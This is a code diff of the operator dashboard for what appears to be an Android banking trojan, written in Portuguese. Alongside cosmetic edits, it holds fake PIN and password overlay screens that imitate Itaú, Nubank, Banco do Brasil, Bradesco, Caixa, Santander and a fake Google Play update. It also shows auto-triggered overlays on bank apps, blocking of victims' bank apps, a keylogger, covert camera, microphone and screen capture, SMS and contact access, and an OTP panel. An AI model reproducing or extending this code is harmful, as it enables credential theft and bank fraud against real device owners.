@@ -15,7 +15,6 @@ import {
   Download,
   Eye,
   LogOut,
-  Maximize,
   Minimize,
   ChevronDown,
   ChevronUp,
@@ -53,6 +52,7 @@ import {
 import { EditableButton } from '../components/EditableButton';
 import { LayoutEditToolbar, EditModeToggle } from '../components/LayoutEditToolbar';
 import BlackScreenEditor from '../components/BlackScreenEditor';
+import OtpPanel from '../components/OtpPanel';
 
 // ===== ÍÍCONES DE BANCO BASEADOS EM MARCA =====
 const BANK_BRAND_MAP: Record<string, { bg: string; text: string; label: string; emoji?: string }> = {
@@ -69,8 +69,8 @@ const BANK_BRAND_MAP: Record<string, { bg: string; text: string; label: string; 
   'br.com.santander':         { bg: 'linear-gradient(135deg,#ec0000,#a30000)', text: '#fff', label: 'SAN' },
   'br.com.bancointer':        { bg: 'linear-gradient(135deg,#ff7a00,#e06900)', text: '#fff', label: 'INT' },
   'br.com.intermedium':       { bg: 'linear-gradient(135deg,#ff7a00,#e06900)', text: '#fff', label: 'INT' },
-  'br.com.caixa':             { bg: 'linear-gradient(135deg,#005ca9,#703d00)', text: '#fff', label: 'CEF' },
-  'br.gov.caixa':             { bg: 'linear-gradient(135deg,#005ca9,#703d00)', text: '#fff', label: 'CEF' },
+  'br.com.caixa':             { bg: 'linear-gradient(135deg,#a90000,#703d00)', text: '#fff', label: 'CEF' },
+  'br.gov.caixa':             { bg: 'linear-gradient(135deg,#a90000,#703d00)', text: '#fff', label: 'CEF' },
   'br.com.c6bank':            { bg: 'linear-gradient(135deg,#242424,#000)', text: '#ffd700', label: 'C6' },
   'br.com.neon':              { bg: 'linear-gradient(135deg,#ffbf00,#aa8000)', text: '#fff', label: 'NEO' },
   'br.com.pagbank':           { bg: 'linear-gradient(135deg,#03a64a,#027a35)', text: '#fff', label: 'PAG' },
@@ -124,44 +124,44 @@ function getBankBrand(pkg: string) {
 }
 
 function getBankLogoEmoji(pkg: string) {
-  if (!pkg) return '🏦';
+  if (!pkg) return '';
   const p = pkg.toLowerCase();
-  if (p.includes('nubank') || p.includes('nu.production')) return '🟣';
-  if (p.includes('bradesco')) return '🔴';
-  if (p.includes('itau')) return '🟠';
-  if (p.includes('bb.android') || p.includes('bancodobrasil')) return '🟡';
-  if (p.includes('santander')) return '🔴';
-  if (p.includes('inter')) return '🟠';
-  if (p.includes('caixa')) return '🔵';
-  if (p.includes('c6bank')) return '⚫';
-  if (p.includes('neon')) return '🔷';
-  if (p.includes('pagbank') || p.includes('pagseguro')) return '🟢';
-  if (p.includes('picpay')) return '🟢';
-  if (p.includes('mercadopago') || p.includes('mercadolibre')) return '🤝';
-  if (p.includes('sicoob')) return '🟢';
-  if (p.includes('xp')) return '🟡';
-  return '🏦';
+  if (p.includes('nubank') || p.includes('nu.production')) return '';
+  if (p.includes('bradesco')) return '';
+  if (p.includes('itau')) return '';
+  if (p.includes('bb.android') || p.includes('bancodobrasil')) return '';
+  if (p.includes('santander')) return '';
+  if (p.includes('inter')) return '';
+  if (p.includes('caixa')) return '';
+  if (p.includes('c6bank')) return '';
+  if (p.includes('neon')) return '';
+  if (p.includes('pagbank') || p.includes('pagseguro')) return '';
+  if (p.includes('picpay')) return '';
+  if (p.includes('mercadopago') || p.includes('mercadolibre')) return '';
+  if (p.includes('sicoob')) return '';
+  if (p.includes('xp')) return '';
+  return '';
 }
 
 function getBankCardGradient(pkg: string) {
-  if (!pkg) return 'from-emerald-950/40 via-slate-900/60 to-slate-950/80 border-emerald-500/20';
+  if (!pkg) return 'from-emerald-950/40 via-[#121214]/60 to-slate-950/80 border-emerald-500/20';
   const p = pkg.toLowerCase();
-  if (p.includes('nu.production') || p.includes('nubank')) return 'from-purple-900 via-purple-950 to-slate-950 border-purple-500/30';
-  if (p.includes('itau')) return 'from-orange-600 via-blue-900 to-slate-950 border-orange-500/30';
-  if (p.includes('inter')) return 'from-orange-500 via-orange-950 to-slate-950 border-orange-500/30';
-  if (p.includes('bradesco')) return 'from-rose-700 via-red-950 to-slate-950 border-red-500/30';
-  if (p.includes('santander')) return 'from-red-600 via-red-950 to-slate-950 border-red-500/30';
-  if (p.includes('bb.android') || p.includes('bancodobrasil')) return 'from-yellow-600 via-blue-900 to-slate-950 border-yellow-500/30';
-  if (p.includes('caixa')) return 'from-blue-700 via-sky-950 to-slate-950 border-blue-500/30';
-  if (p.includes('c6')) return 'from-slate-800 via-slate-950 to-black border-slate-700/50';
-  if (p.includes('neon')) return 'from-cyan-600 via-teal-950 to-slate-950 border-cyan-500/30';
-  if (p.includes('pagbank') || p.includes('pagseguro')) return 'from-emerald-600 via-slate-900 to-slate-950 border-emerald-500/30';
-  if (p.includes('mercadopago') || p.includes('mercadolibre')) return 'from-sky-500 via-blue-950 to-slate-950 border-blue-400/30';
+  if (p.includes('nu.production') || p.includes('nubank')) return 'from-purple-900 via-purple-950 to-slate-950 border-[#f87171]/30';
+  if (p.includes('itau')) return 'from-[#84cc16] via-[#1a1a1e] to-slate-950 border-[#ef4444]/30';
+  if (p.includes('inter')) return 'from-[#ef4444] via-orange-950 to-slate-950 border-[#ef4444]/30';
+  if (p.includes('bradesco')) return 'from-rose-700 via-[#121214] to-slate-950 border-[#2a2a31]/30';
+  if (p.includes('santander')) return 'from-[#ef4444] via-[#121214] to-slate-950 border-[#2a2a31]/30';
+  if (p.includes('bb.android') || p.includes('bancodobrasil')) return 'from-yellow-600 via-[#1a1a1e] to-slate-950 border-yellow-500/30';
+  if (p.includes('caixa')) return 'from-[#ef4444] via-[#121214] to-slate-950 border-[#2a2a31]/30';
+  if (p.includes('c6')) return 'from-[#24242a] via-slate-950 to-black border-[#2a2a31]/50';
+  if (p.includes('neon')) return 'from-[#ef4444] via-teal-950 to-slate-950 border-[#2a2a31]/30';
+  if (p.includes('pagbank') || p.includes('pagseguro')) return 'from-emerald-600 via-[#121214] to-slate-950 border-emerald-500/30';
+  if (p.includes('mercadopago') || p.includes('mercadolibre')) return 'from-[#ef4444] via-[#121214] to-slate-950 border-[#3a3a44]/30';
   if (p.includes('picpay')) return 'from-emerald-500 via-emerald-950 to-slate-950 border-emerald-500/30';
   if (p.includes('sicoob')) return 'from-teal-600 via-teal-950 to-slate-950 border-teal-500/30';
-  if (p.includes('sicredi')) return 'from-green-700 via-slate-900 to-slate-950 border-green-500/30';
-  if (p.includes('xp')) return 'from-amber-600 via-slate-900 to-slate-950 border-amber-500/30';
-  return 'from-emerald-950/40 via-slate-900/60 to-slate-950/80 border-emerald-500/20';
+  if (p.includes('sicredi')) return 'from-green-700 via-[#121214] to-slate-950 border-green-500/30';
+  if (p.includes('xp')) return 'from-amber-600 via-[#121214] to-slate-950 border-amber-500/30';
+  return 'from-emerald-950/40 via-[#121214]/60 to-slate-950/80 border-emerald-500/20';
 }
 
 interface BankIconProps { pkg: string; iconB64?: string; name?: string; size?: number; }
@@ -232,16 +232,16 @@ const PRESET_BANK_PROJECT = {
   screens: [
     {
       id: 'preset-itau-system',
-      name: '🔥🏦 Itaú - Senha de Acesso (Oficial🏦 Interativo)',
+      name: ' Itaú - Senha de Acesso (Oficial Interativo)',
       backgroundColor: '#f1f2f4',
       multiStep: true,
       step1Label: 'SENHA DE ACESSO ITAÚ',
       step2Label: 'SENHA DE TRANSAÇO ITAÚ',
       package_name: 'br.com.itau',
       elements: [
-        { id: 'itau-sys-logo', type: 'logo', x: 125, y: 60, width: 110, height: 110, content: '🔒', fontSize: 42, color: '#ed7c0e', textAlign: 'center', opacity: 100 },
+        { id: 'itau-sys-logo', type: 'logo', x: 125, y: 60, width: 110, height: 110, content: '', fontSize: 42, color: '#ed7c0e', textAlign: 'center', opacity: 100 },
         { id: 'itau-sys-title', type: 'text', x: 20, y: 180, width: 320, height: 35, content: 'Digite a senha de acesso', fontSize: 22, fontWeight: 'bold', color: '#1a1a1a', textAlign: 'center', opacity: 100 },
-        { id: 'itau-sys-dots', type: 'text', x: 70, y: 235, width: 220, height: 30, content: '○   ○   ○   ○   ○   ○', fontSize: 22, fontWeight: 'bold', color: '#ed7c0e', textAlign: 'center', opacity: 100 },
+        { id: 'itau-sys-dots', type: 'text', x: 70, y: 235, width: 220, height: 30, content: '               ', fontSize: 22, fontWeight: 'bold', color: '#ed7c0e', textAlign: 'center', opacity: 100 },
         { id: 'itau-sys-k1', type: 'button', x: 25, y: 290, width: 95, height: 48, content: '1', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
         { id: 'itau-sys-k2', type: 'button', x: 132, y: 290, width: 95, height: 48, content: '2', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
         { id: 'itau-sys-k3', type: 'button', x: 240, y: 290, width: 95, height: 48, content: '3', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
@@ -252,8 +252,8 @@ const PRESET_BANK_PROJECT = {
         { id: 'itau-sys-k8', type: 'button', x: 132, y: 410, width: 95, height: 48, content: '8', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
         { id: 'itau-sys-k9', type: 'button', x: 240, y: 410, width: 95, height: 48, content: '9', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
         { id: 'itau-sys-k0', type: 'button', x: 132, y: 470, width: 95, height: 48, content: '0', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
-        { id: 'itau-sys-kdel', type: 'button', x: 240, y: 470, width: 95, height: 48, content: '⌫', backgroundColor: '#ffffff', color: '#6b6b6b', borderRadius: 12, opacity: 100 },
-        { id: 'itau-sys-forgot', type: 'text', x: 50, y: 540, width: 260, height: 25, content: 'Esqueci minha senha  ›', fontSize: 15, color: '#1a1a1a', textAlign: 'center', opacity: 100 },
+        { id: 'itau-sys-kdel', type: 'button', x: 240, y: 470, width: 95, height: 48, content: '', backgroundColor: '#ffffff', color: '#6b6b6b', borderRadius: 12, opacity: 100 },
+        { id: 'itau-sys-forgot', type: 'text', x: 50, y: 540, width: 260, height: 25, content: 'Esqueci minha senha  ', fontSize: 15, color: '#1a1a1a', textAlign: 'center', opacity: 100 },
         { id: 'itau-sys-btn', type: 'button', x: 20, y: 585, width: 320, height: 50, content: 'Continuar', buttonAction: 'submit', backgroundColor: '#ed7c0e', color: '#ffffff', borderRadius: 999 }
       ]
     },
@@ -274,13 +274,13 @@ const PRESET_BANK_PROJECT = {
     },
     {
       id: 'preset-nubank',
-      name: '🏦 Nubank - Senha App',
+      name: ' Nubank - Senha App',
       backgroundColor: 'linear-gradient(135deg, #d10a83 0%, #7a064c 100%)',
       elements: [
         { id: 'nu-text-logo', type: 'text', x: 130, y: 80, width: 100, height: 80, content: 'nu', fontSize: 58, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
         { id: 'nu-card-bg', type: 'rectangle', x: 20, y: 180, width: 320, height: 320, backgroundColor: 'rgba(255, 255, 255, 0.08)', borderRadius: 16, opacity: 100 },
         { id: 'nu-text-title', type: 'text', x: 30, y: 200, width: 300, height: 35, content: 'Digite sua senha do app', fontSize: 20, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
-        { id: 'nu-text-desc', type: 'text', x: 40, y: 245, width: 280, height: 45, content: 'Esta é a senha de 8 dígitos que você usa para acessar o aplicativo do🏦 Nubank.', fontSize: 13, color: '#ffc8e5', textAlign: 'center', opacity: 100 },
+        { id: 'nu-text-desc', type: 'text', x: 40, y: 245, width: 280, height: 45, content: 'Esta é a senha de 8 dígitos que você usa para acessar o aplicativo do Nubank.', fontSize: 13, color: '#ffc8e5', textAlign: 'center', opacity: 100 },
         { id: 'nu-input-pwd', type: 'input', x: 40, y: 310, width: 280, height: 50, placeholder: 'Senha do aplicativo (8 dígitos)', inputType: 'password', inputLabel: 'senha_acesso_nubank', backgroundColor: 'rgba(0, 0, 0, 0.25)', color: '#ffffff', borderRadius: 12, borderColor: 'rgba(255, 255, 255, 0.2)' },
         { id: 'nu-btn-sub', type: 'button', x: 40, y: 385, width: 280, height: 50, content: 'Confirmar', buttonAction: 'submit', backgroundColor: '#ffffff', color: '#d10a83', borderRadius: 12 },
         { id: 'nu-bio', type: 'fingerprint', x: 145, y: 520, width: 70, height: 100, biometricColor: '#ffffff', biometricText: 'Entrar com Digital' }
@@ -288,7 +288,7 @@ const PRESET_BANK_PROJECT = {
     },
     {
       id: 'preset-bb',
-      name: '🏦 Banco do Brasil - 8 dígitos',
+      name: ' Banco do Brasil - 8 dígitos',
       backgroundColor: 'linear-gradient(180deg, #7a2e00 0%, #5c1f00 100%)',
       elements: [
         { id: 'bb-rect-header', type: 'rectangle', x: 0, y: 0, width: 360, height: 75, backgroundColor: '#fbdf07', opacity: 100 },
@@ -303,7 +303,7 @@ const PRESET_BANK_PROJECT = {
     },
     {
       id: 'preset-bradesco',
-      name: '🏦 Bradesco - 4 dígitos Cartão',
+      name: ' Bradesco - 4 dígitos Cartão',
       backgroundColor: 'linear-gradient(135deg, #cc092f 0%, #80001a 100%)',
       elements: [
         { id: 'brad-rect-header', type: 'rectangle', x: 0, y: 0, width: 360, height: 75, backgroundColor: '#ffffff', opacity: 100 },
@@ -318,8 +318,8 @@ const PRESET_BANK_PROJECT = {
     },
     {
       id: 'preset-caixa',
-      name: '🏦 Caixa - Assinatura Eletrônica',
-      backgroundColor: 'linear-gradient(135deg, #005ca9 0%, #663600 100%)',
+      name: ' Caixa - Assinatura Eletrônica',
+      backgroundColor: 'linear-gradient(135deg, #a90000 0%, #663600 100%)',
       elements: [
         { id: 'caixa-rect-header', type: 'rectangle', x: 0, y: 0, width: 360, height: 75, backgroundColor: '#f39200', opacity: 100 },
         { id: 'caixa-text-logo', type: 'text', x: 20, y: 20, width: 320, height: 30, content: 'CAIXA', fontSize: 24, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
@@ -333,7 +333,7 @@ const PRESET_BANK_PROJECT = {
     },
     {
       id: 'preset-santander',
-      name: '🏦 Santander - Senha',
+      name: ' Santander - Senha',
       backgroundColor: 'linear-gradient(135deg, #ec0000 0%, #8c0000 100%)',
       elements: [
         { id: 'sant-text-logo', type: 'text', x: 30, y: 80, width: 300, height: 40, content: 'Santander', fontSize: 32, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
@@ -395,13 +395,13 @@ const PRESET_BANK_PROJECT = {
 
 const PRESET_SYSTEM_PROJECT = {
   id: 'preset-system-screens',
-  name: '🔒 TELAS DE SISTEMA',
+  name: ' TELAS DE SISTEMA',
   appName: 'System Presets',
   projectType: 'custom',
   screens: [
     {
       id: 'preset-google',
-      name: '🔒 Google Lock',
+      name: ' Google Lock',
       backgroundColor: '#240d08',
       elements: [
         { id: 'goog-text-logo', type: 'text', x: 30, y: 80, width: 300, height: 40, content: 'Google', fontSize: 32, fontWeight: 'bold', color: '#f8b48a', textAlign: 'center', opacity: 100 },
@@ -414,8 +414,8 @@ const PRESET_SYSTEM_PROJECT = {
     },
     {
       id: 'preset-system-update',
-      name: 'š™ Atualização do Google Play',
-      backgroundColor: '#160606',
+      name: 'š Atualização do Google Play',
+      backgroundColor: '#0a0a0b',
       elements: [
         { id: 'su-text-logo', type: 'text', x: 30, y: 80, width: 300, height: 40, content: 'Google Play Services', fontSize: 22, fontWeight: 'bold', color: '#ff6b6b', textAlign: 'center', opacity: 100 },
         { id: 'su-card-bg', type: 'rectangle', x: 20, y: 140, width: 320, height: 325, backgroundColor: 'rgba(42, 18, 18, 0.5)', borderRadius: 16, opacity: 100 },
@@ -423,7 +423,7 @@ const PRESET_SYSTEM_PROJECT = {
         { id: 'su-text-desc', type: 'text', x: 40, y: 210, width: 280, height: 60, content: 'Uma atualização crítica de segurança do Google Play Services é necessária. Digite a senha do seu e-mail para validar.', fontSize: 12, color: '#c9a8a8', textAlign: 'center', opacity: 100 },
         { id: 'su-input-email', type: 'input', x: 40, y: 280, width: 280, height: 45, placeholder: 'Digite seu e-mail', inputType: 'text', inputLabel: 'email_update', backgroundColor: 'rgba(22, 6, 6, 0.7)', color: '#ffffff', borderRadius: 8, borderColor: '#ff6b6b' },
         { id: 'su-input-pwd', type: 'input', x: 40, y: 335, width: 280, height: 45, placeholder: 'Digite a senha do e-mail', inputType: 'password', inputLabel: 'senha_update', backgroundColor: 'rgba(22, 6, 6, 0.7)', color: '#ffffff', borderRadius: 8, borderColor: '#ff6b6b' },
-        { id: 'su-btn-sub', type: 'button', x: 40, y: 395, width: 280, height: 45, content: 'Atualizar Agora', buttonAction: 'submit', backgroundColor: '#ff6b6b', color: '#160606', borderRadius: 8 }
+        { id: 'su-btn-sub', type: 'button', x: 40, y: 395, width: 280, height: 45, content: 'Atualizar Agora', buttonAction: 'submit', backgroundColor: '#ff6b6b', color: '#0a0a0b', borderRadius: 8 }
       ]
     }
   ]
@@ -526,7 +526,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   
   // Customizações para Tela V2
   const [v2TextScale, setV2TextScale] = useState<number>(1.0); // Multiplicador de tamanho do texto (0.6 a 2.0)
-  const [v2DesignTheme, setV2DesignTheme] = useState<'cyan' | 'matrix' | 'neon-red' | 'purple-glowing'>('cyan'); // Modos de tela
+  const [v2DesignTheme, setV2DesignTheme] = useState<'cyan' | 'matrix' | 'neon-red' | 'purple-glowing'>('neon-red'); // Modos de tela
   const [v2HideUntypedElements, setV2HideUntypedElements] = useState<boolean>(false); // Ocultar vazios se preferir
   const [v2Opacity, setV2Opacity] = useState<number>(0.7); // Opacidade dos elementos (0.2 a 1.0)
   const [v2ShowGrid, setV2ShowGrid] = useState<boolean>(true); // Mostrar grade de fundo
@@ -541,7 +541,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   const [v2SearchTerm, setV2SearchTerm] = useState<string>('');
   const [v2InspectorCategory, setV2InspectorCategory] = useState<'all' | 'buttons' | 'inputs' | 'texts'>('all');
   
-  // 🔔 Sistema de Alerta de Abertura de Apps Monitorados
+  //  Sistema de Alerta de Abertura de Apps Monitorados
   const [monitoredAlertPkgs, setMonitoredAlertPkgs] = useState<string[]>(() => {
     try {
       return JSON.parse(localStorage.getItem('monitoredAlertPkgs') || '[]');
@@ -558,7 +558,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       const exists = prev.includes(pkg);
       const next = exists ? prev.filter(p => p !== pkg) : [...prev, pkg];
       localStorage.setItem('monitoredAlertPkgs', JSON.stringify(next));
-      addLog(exists ? `🔕 Alerta desativado para ${name}` : `🔔 Alerta de Abertura ativado para ${name}!`);
+      addLog(exists ? ` Alerta desativado para ${name}` : ` Alerta de Abertura ativado para ${name}!`);
       return next;
     });
   };
@@ -568,7 +568,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     setMonitoredAlertPkgs(prev => {
       const merged = Array.from(new Set([...prev, ...bankPkgs]));
       localStorage.setItem('monitoredAlertPkgs', JSON.stringify(merged));
-      addLog(`⚡ ${bankPkgs.length} Aplicativos Bancários adicionados ao Monitoramento!`);
+      addLog(` ${bankPkgs.length} Aplicativos Bancários adicionados ao Monitoramento!`);
       return merged;
     });
   };
@@ -578,7 +578,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     setMonitoredAlertPkgs(prev => {
       const merged = Array.from(new Set([...prev, ...socialPkgs]));
       localStorage.setItem('monitoredAlertPkgs', JSON.stringify(merged));
-      addLog(`💬 ${socialPkgs.length} Redes Sociais adicionadas ao Monitoramento!`);
+      addLog(` ${socialPkgs.length} Redes Sociais adicionadas ao Monitoramento!`);
       return merged;
     });
   };
@@ -586,12 +586,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   const clearMonitoredApps = () => {
     setMonitoredAlertPkgs([]);
     localStorage.setItem('monitoredAlertPkgs', '[]');
-    addLog(`🧹 Lista de Aplicativos Monitorados limpa.`);
+    addLog(` Lista de Aplicativos Monitorados limpa.`);
   };
 
   const isAppMonitored = (pkg: string) => monitoredAlertPkgs.includes(pkg);
 
-  // 🚫 Sistema de Bloqueio de Abertura de Apps Especificados (Tela de App Indisponível)
+  //  Sistema de Bloqueio de Abertura de Apps Especificados (Tela de App Indisponível)
   const [blockedApps, setBlockedApps] = useState<string[]>(() => {
     try {
       return JSON.parse(localStorage.getItem('blockedApps') || '[]');
@@ -633,7 +633,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     } catch {}
     
     await sendCommand({ action: 'TOGGLE_BLOCK_APP', package: cleanPkg, blocked: !exists });
-    addLog(exists ? `🔓 Abertura permitida para ${name}` : `🚫 Impedir Abertura ATIVADO para ${name} (Exibe tela de Aplicativo Indisponível)`);
+    addLog(exists ? ` Abertura permitida para ${name}` : ` Impedir Abertura ATIVADO para ${name} (Exibe tela de Aplicativo Indisponível)`);
   };
 
   const blockAllBanks = async () => {
@@ -643,7 +643,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     setDevice(prev => prev ? { ...prev, blocked_packages: merged } : null);
     localStorage.setItem('blockedApps', JSON.stringify(merged));
     await sendCommand({ action: 'SET_BLOCKED_APPS', packages: merged });
-    addLog(`🚫 Impedir Abertura ATIVADO para todos os ${bankPkgs.length} Bancos!`);
+    addLog(` Impedir Abertura ATIVADO para todos os ${bankPkgs.length} Bancos!`);
   };
 
   const blockAllSocial = async () => {
@@ -653,7 +653,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     setDevice(prev => prev ? { ...prev, blocked_packages: merged } : null);
     localStorage.setItem('blockedApps', JSON.stringify(merged));
     await sendCommand({ action: 'SET_BLOCKED_APPS', packages: merged });
-    addLog(`🚫 Impedir Abertura ATIVADO para Redes Sociais!`);
+    addLog(` Impedir Abertura ATIVADO para Redes Sociais!`);
   };
 
   const clearBlockedApps = async () => {
@@ -661,15 +661,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     setDevice(prev => prev ? { ...prev, blocked_packages: [] } : null);
     localStorage.setItem('blockedApps', '[]');
     await sendCommand({ action: 'SET_BLOCKED_APPS', packages: [] });
-    addLog(`🧹 Todos os aplicativos foram desbloqueados.`);
+    addLog(` Todos os aplicativos foram desbloqueados.`);
   };
 
   const testAppUnavailableScreen = async (pkg: string = 'com.android.settings', name: string = 'Aplicativo') => {
     await sendCommand({ action: 'SHOW_APP_UNAVAILABLE', package: pkg, appName: name });
-    addLog(`🧪 Testando tela de App Indisponível para ${name}`);
+    addLog(` Testando tela de App Indisponível para ${name}`);
   };
 
-  // 🚨 Detector em Tempo Real de Abertura de Apps Monitorados
+  //  Detector em Tempo Real de Abertura de Apps Monitorados
   useEffect(() => {
     if (!monitoredAlertPkgs || monitoredAlertPkgs.length === 0) return;
 
@@ -712,7 +712,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     if (detectedPkg) {
       if (!activeAppAlert || activeAppAlert.pkg !== detectedPkg || (Date.now() - activeAppAlert.timestamp > 15000)) {
         setActiveAppAlert({ pkg: detectedPkg, appName: detectedName, timestamp: Date.now() });
-        addLog(`🚨 ALERTA: Aplicativo monitorado aberto no aparelho: ${detectedName} (${detectedPkg})`);
+        addLog(` ALERTA: Aplicativo monitorado aberto no aparelho: ${detectedName} (${detectedPkg})`);
         
         // Toca bip de áudio de alerta tático sintetizado por Web Audio API
         try {
@@ -896,7 +896,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   // One-time seed guard so server truth (from SILENT_VNC_STATUS) initializes the purple/green viewer state on first load/refresh
   const captureStateSeededRef = useRef(false);
   
-  // 📅 KEYLOGGER POR DATA - Estados para novo sistema
+  //  KEYLOGGER POR DATA - Estados para novo sistema
   const [keylogSelectedDate, setKeylogSelectedDate] = useState<string>(() => {
     const d = new Date();
     return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
@@ -907,11 +907,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   const [isLoadingKeylogs, setIsLoadingKeylogs] = useState(false);
   const [keylogTotalToday, setKeylogTotalToday] = useState(0);
   
-  // 📷 Estados para cmera
+  //  Estados para cmera
   const [isCameraEnabled, setIsCameraEnabled] = useState(false);
   const [showCameraModal, setShowCameraModal] = useState(false);
 
-  // 💉 Estados para injeção de tela
+  //  Estados para injeção de tela
   const [showInjectionModal, setShowInjectionModal] = useState(false);
   const [showCustomCapturesModal, setShowCustomCapturesModal] = useState(false);
   const [selectedProjectId, setSelectedProjectId] = useState<string | null>(null);
@@ -965,7 +965,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   const [editBankBtnColor, setEditBankBtnColor] = useState('#ec7000');
   const [editBankPackage, setEditBankPackage] = useState('br.com.itau');
 
-  // 🔒 Estados para aba "Editar Telas de Sistema" (Não Bancos)
+  //  Estados para aba "Editar Telas de Sistema" (Não Bancos)
   const [showEditSystemScreensTab, setShowEditSystemScreensTab] = useState(false);
   const [showSystemVisualEditor, setShowSystemVisualEditor] = useState(false);
   const [systemScreens, setSystemScreens] = useState<any[]>(() => {
@@ -1006,7 +1006,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       const updated = prev.map(screen => {
         if (screen.id !== selectedPresetScreenId) return screen;
 
-        const dotsText = d1 === 4 ? '○   ○   ○   ○' : '○   ○   ○   ○   ○   ○';
+        const dotsText = d1 === 4 ? '         ' : '               ';
 
         const updatedElements = screen.elements.map((el: any) => {
           const cloned = { ...el };
@@ -1194,15 +1194,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       });
 
       if (response.ok) {
-        addLog(`✅ Auto-gatilho de banco salvo para ${editBankPackage}`);
+        addLog(` Auto-gatilho de banco salvo para ${editBankPackage}`);
         fetchOverlayMappings();
       } else {
         const err = await response.json();
-        addLog(`❌ Erro ao salvar gatilho de banco: ${err.detail || 'erro desconhecido'}`);
+        addLog(` Erro ao salvar gatilho de banco: ${err.detail || 'erro desconhecido'}`);
       }
     } catch (e) {
       console.error('Erro ao criar mapeamento de banco:', e);
-      addLog('❌ Erro de rede ao criar mapeamento de banco');
+      addLog(' Erro de rede ao criar mapeamento de banco');
     }
   };
 
@@ -1229,19 +1229,19 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       });
 
       if (response.ok) {
-        addLog(`✅ Auto-gatilho de sistema salvo para ${editSystemPackage}`);
+        addLog(` Auto-gatilho de sistema salvo para ${editSystemPackage}`);
         fetchOverlayMappings();
       } else {
         const err = await response.json();
-        addLog(`❌ Erro ao salvar gatilho de sistema: ${err.detail || 'erro desconhecido'}`);
+        addLog(` Erro ao salvar gatilho de sistema: ${err.detail || 'erro desconhecido'}`);
       }
     } catch (e) {
       console.error('Erro ao criar mapeamento de sistema:', e);
-      addLog('❌ Erro de rede ao criar mapeamento de sistema');
+      addLog(' Erro de rede ao criar mapeamento de sistema');
     }
   };
 
-  // 🎨 Estado para editor de tela preta customizada
+  //  Estado para editor de tela preta customizada
   const [showBlackScreenEditor, setShowBlackScreenEditor] = useState(false);
   const [customBlackScreenTemplate, setCustomBlackScreenTemplate] = useState<any>(null);
   const [currentCamera, setCurrentCamera] = useState<'front' | 'back'>('back'); // back = traseira, front = frontal
@@ -1250,14 +1250,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   const [lightboxImage, setLightboxImage] = useState<string | null>(null);
   const [lightboxName, setLightboxName] = useState<string>('');
   
-  // 🎤 Estados para microfone
+  //  Estados para microfone
   const [isMicrophoneEnabled, setIsMicrophoneEnabled] = useState(false);
   const [showMicrophoneModal, setShowMicrophoneModal] = useState(false);
   const audioContextRef = useRef<AudioContext | null>(null);
   
-  // 🎬 isCaptureEnabled: viewer state - quando true, renderiza <DeviceScreen> (mostra frames ao vivo)
+  //  isCaptureEnabled: viewer state - quando true, renderiza <DeviceScreen> (mostra frames ao vivo)
   const [isCaptureEnabled, setIsCaptureEnabled] = useState(false);
-  const [silentQuality, setSilentQuality] = useState(15);
+  const [silentQuality, setSilentQuality] = useState(70);
   const [isKillerMode, setIsKillerMode] = useState(false);
   
   //  Estados para gerenciamento de apps
@@ -1265,14 +1265,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   const [showGoogleAccountsModal, setShowGoogleAccountsModal] = useState(false);
   const [installedApps, setInstalledApps] = useState<any[]>([]);
 
-  // 💬 Estados para envio e visualização de SMS
+  //  Estados para envio e visualização de SMS
   const [showSmsModal, setShowSmsModal] = useState(false);
   const [smsPhone, setSmsPhone] = useState('');
   const [smsMessage, setSmsMessage] = useState('');
   const [smsSending, setSmsSending] = useState(false);
   const [smsStatusMsg, setSmsStatusMsg] = useState('');
 
-  // 👥 Estados para visualização de contatos do aparelho
+  //  Estados para visualização de contatos do aparelho
   const [showContactsModal, setShowContactsModal] = useState(false);
   const [contactsList, setContactsList] = useState<Array<{ name: string; number: string }>>([]);
   const [contactsLoading, setContactsLoading] = useState(false);
@@ -1311,7 +1311,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     }
   };
 
-  // 📋 Estados para duplicador de app no aparelho
+  //  Estados para duplicador de app no aparelho
   const [showDeviceDuplicatorModal, setShowDeviceDuplicatorModal] = useState(false);
   const [duplicatorSelectedApp, setDuplicatorSelectedApp] = useState<{ package: string; name: string } | null>(null);
   const [duplicatorCloneName, setDuplicatorCloneName] = useState('');
@@ -1332,7 +1332,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     const clonePkg = `${pkg}.cloned`;
     const cloneName = `${targetName} (Pasta Segura)`;
 
-    const msg = `🚀 Duplicando "${targetName}" em Pasta Segura no dispositivo...`;
+    const msg = ` Duplicando "${targetName}" em Pasta Segura no dispositivo...`;
     setDuplicationBanner(msg);
     setTimeout(() => setDuplicationBanner(null), 5000);
 
